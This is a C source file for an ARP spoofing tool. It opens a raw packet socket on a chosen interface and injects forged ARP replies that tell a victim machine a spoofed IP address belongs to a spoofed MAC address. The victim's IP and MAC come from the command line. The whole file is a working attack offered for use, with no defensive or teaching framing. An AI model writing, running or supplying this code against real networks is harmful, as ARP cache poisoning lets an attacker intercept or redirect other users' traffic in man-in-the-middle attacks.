#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <net/if_arp.h>
#include <strings.h>
#include <string.h>
#include <pthread.h>

/*Global Var*/
char * interface;
char * victim_ip;
char * spoofed_ip;
char * victim_mac;
char * spoofed_mac;

/*Raw socket creation/read/write code*/

int CreateRawSocket(int protocol) {

	int rawsock;
	
	if((rawsock=socket(PF_PACKET,SOCK_RAW,htons(protocol)))==-1) {
		perror("Error creating raw socket");
		exit(-1);
	}

	return rawsock;
}

int BindRawSocketToInterface(char *device, int rawsock, int protocol) {

	struct sockaddr_ll sll;
	struct ifreq ifr;

	bzero(&sll, sizeof(sll));
	bzero(&ifr, sizeof(ifr));

	/* first get the interface index */
	strncpy((char*)ifr.ifr_name, device, IFNAMSIZ);
	if((ioctl(rawsock, SIOCGIFINDEX, &ifr))==-1) {
		printf("Error getting Interface index !\n");
		exit(-1);
	}

	/* bind our raw socket into this interface */
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifr.ifr_ifindex;
	sll.sll_protocol = htons(protocol);

	if((bind(rawsock, (struct sockaddr*)&sll, sizeof(sll)))== -1) {
		perror("Error binding raw socket to interface\n");
		exit(-1);
	}

	return 1;
}

int SendRawPacket(int rawsock, unsigned char *pkt, int pkt_len) {
	int sent = 0;

	/* a simple write on the socket */
	if((sent = write(rawsock, pkt, pkt_len)) != pkt_len) {
		/* error*/
		printf("could only send %d bytes of packet of length %d \n",sent, pkt_len);
		return 0;
	}

	return 1;
}


void PrintPacketInHex(unsigned char * packet, int len) {
	unsigned char * p = packet;

	printf("\n\n---------Packet---Starts-------\n\n");
	
	while(len--) {
		printf("%.2x",*p);
		p++;
	}

	printf("\n\n---------Packet---Ends---------\n\n");
}

#define MAX_PACKETS 5

typedef struct EthernetHeader {

	unsigned char destination[6];
	unsigned char source[6];
	unsigned short protocol;
}EthernetHeader;

typedef struct ArpHeader {

	unsigned short hardware_type;
	unsigned short protocol_type;
	unsigned short hard_prot_len;
	unsigned short opcode;
	unsigned char source_hardware[6];
	unsigned char source_ip[4];
	unsigned char dest_hardware[6];
	unsigned char dest_ip[4];
}ArpHeader;

injector() {
	
	int raw;
	int counter=MAX_PACKETS;
	EthernetHeader *ethernet_header;
	ArpHeader * arp_header;
	void * buff = malloc(sizeof(EthernetHeader)+sizeof(ArpHeader));
	
	/* create the raw socket */
	raw = CreateRawSocket(ETH_P_ALL);
	/* bind socket to interface */
	BindRawSocketToInterface(interface,raw,ETH_P_ALL);

	while(counter) {

			ethernet_header = (EthernetHeader*)buff;
			arp_header = (ArpHeader*)(buff+sizeof(EthernetHeader));
			/* change the ethernet headers */
			/* copy the source address of the packet as the destination address */

			memcpy(ethernet_header->destination, (void*)ether_aton(victim_mac),6);

			/* copy the spoofed MAC as the source address of the packet */
			memcpy(ethernet_header->source, (void*)ether_aton(spoofed_mac),6);
			ethernet_header->protocol = htons(ETH_P_ARP);

			/* change the arp headers accordingly */
			/* make it into an arp reply */
			arp_header->hardware_type=256;
			arp_header->protocol_type=htons(ETH_P_IP);
			arp_header->opcode = htons(ARPOP_REPLY);
			arp_header->hard_prot_len=1030;

			/* adjust the MAC addresses and IP addresses accordingly in the arp header */
			memcpy(arp_header->source_hardware, (void*)ether_aton(spoofed_mac),6);
			memcpy(arp_header->dest_hardware, (void*)ether_aton(victim_mac), 6);

			inet_aton(victim_ip, arp_header->dest_ip);
			inet_aton(spoofed_ip, arp_header->source_ip);

			

			/* send it out */
			if(SendRawPacket(raw, buff, sizeof(EthernetHeader)+sizeof(ArpHeader))) {
				printf("injector: inject ARP reply\n");
			}
			else {
				printf("injector: unable to inject\n");
			}

			PrintPacketInHex(buff,sizeof(EthernetHeader)+sizeof(ArpHeader));			

			counter--;
	}
	free(buff);
	close(raw);	
}

main(int argc, char** argv) {
	/* assign the interface victim machine's ip and mac spoofed machine's ip and mac */
	interface=argv[1];
	victim_ip=argv[3];
	spoofed_mac=argv[4];
	spoofed_ip=argv[5];
	victim_mac=argv[2];

	injector();
	return 0;
}
